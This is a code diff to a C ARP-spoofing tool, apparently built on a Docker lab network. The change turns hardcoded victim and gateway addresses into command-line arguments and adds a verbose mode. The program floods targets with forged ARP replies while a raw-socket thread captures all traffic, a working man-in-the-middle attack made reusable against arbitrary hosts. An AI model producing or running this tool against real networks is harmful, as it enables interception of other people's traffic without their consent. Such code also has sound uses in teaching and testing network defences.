@@ -17,7 +17,8 @@
 #define ETH_HDR_LEN 14
 #define ARP_PKT_LEN 28
 
-
+int verbose = 0;
+const char *iface = "br-ef81d046a1ff";
 typedef struct eth_h {
     unsigned char dest_mac[6];
     unsigned char src_mac[6];
@@ -37,7 +38,7 @@ typedef struct arp_h {
 } arp_hdr;
 
 
-void send_arp_reply(char* iface, char* target_mac, char* your_mac, char* gateway_ip, char* target_ip)
+void send_arp_reply(char* target_mac, char* your_mac, char* gateway_ip, char* target_ip)
 {
   
     int sockfd;
@@ -108,8 +109,11 @@ void print_hex_ascii(const unsigned char *data, int len) {
     }
     printf("\n");
 }
-void print_packet(unsigned char * buffer,size_t size)
+
+// Modify print_packet function to check verbose flag
+void print_packet(unsigned char * buffer, size_t size)
 {
+    if (!verbose) return;  // Only print if verbose mode is enabled
     struct ethhdr *eth = (struct ethhdr *)buffer;
     struct iphdr *ip = (struct iphdr *)(buffer + ETH_HDR_LEN);
     struct tcphdr *tcp = (struct tcphdr *)(buffer + ETH_HDR_LEN + sizeof(struct iphdr));
@@ -146,7 +150,6 @@ void print_packet(unsigned char * buffer,size_t size)
 
 void* sniff_packets(void *arg) {
     int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    const char *iface = "br-ef81d046a1ff";
     unsigned int ifindex = if_nametoindex(iface);
     struct sockaddr_ll addr = {0};
     memset(&addr, 0, sizeof(struct sockaddr_ll));
@@ -167,20 +170,67 @@ void* sniff_packets(void *arg) {
     return NULL;
 }
 
-int main() {
-    int turn = 0;
-    pthread_t sniff_thread;
-    char *iface = "br-ef81d046a1ff";
-    char *target_ip = "172.18.0.3";
-    char *gateway_ip = "172.18.0.2";
-    char *your_mac = "02:42:46:6f:8f:09";
-    char *target_mac = "02:42:ac:12:00:03";
-    pthread_create(&sniff_thread, NULL, sniff_packets, NULL);
-    while (1) {
-        send_arp_reply(iface, target_mac, your_mac, gateway_ip, target_ip);
-        send_arp_reply(iface, "02:42:ac:12:00:02", your_mac,target_ip, "172.18.0.2");
-        sleep(5);
-        turn++;
+void print_usage(char *program) {
+    printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]\n", program);
+    printf("Parameters:\n");
+    printf("  <IP-src>     : Source IP address\n");
+    printf("  <MAC-src>    : Source MAC address\n");
+    printf("  <IP-target>  : Target IP address\n");
+    printf("  <MAC-target> : Target MAC address\n");
+    printf("  -v           : Verbose mode (optional)\n");
+    exit(1);
+}
+
+int is_valid_mac(char *mac) {
+    int i = 0;
+    while (mac[i]) {
+        if (!isxdigit(mac[i]) && mac[i] != ':')
+            return 0;
+        i++;
     }
+    return 1;
+}
+
+int is_valid_ip(char *ip) {
+    struct sockaddr_in sa;
+    int result = inet_pton(AF_INET, ip, &(sa.sin_addr));
+    return result != 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 5)
+        print_usage(argv[0]);
+
+    if (argc > 5 && strcmp(argv[5], "-v") != 0)
+        print_usage(argv[0]);
+
+    verbose = (argc > 5 && strcmp(argv[5], "-v") == 0);
+
+    char *src_ip = argv[1];
+    char *src_mac = argv[2];
+    char *target_ip = argv[3];
+    char *target_mac = argv[4];
+    
+    if (!is_valid_ip(src_ip) || !is_valid_mac(src_mac) ||
+        !is_valid_ip(target_ip) || !is_valid_mac(target_mac)) {
+        printf("Invalid IP or MAC address\n");
+        exit(1);
+    }
+    pthread_t sniff_thread;
+
+    if (verbose) {
+        printf("Starting ARP spoofing attack:\n");
+        printf("Source IP: %s, Source MAC: %s\n", src_ip, src_mac);
+        printf("Target IP: %s, Target MAC: %s\n", target_ip, target_mac);
+    }
+
+    pthread_create(&sniff_thread, NULL, sniff_packets, NULL);
+
+    while (1) {
+        send_arp_reply(target_mac, src_mac, src_ip, target_ip);
+        send_arp_reply(src_mac, src_mac, target_ip, src_ip);
+        sleep(5);
+    }
+
     return 0;
 }
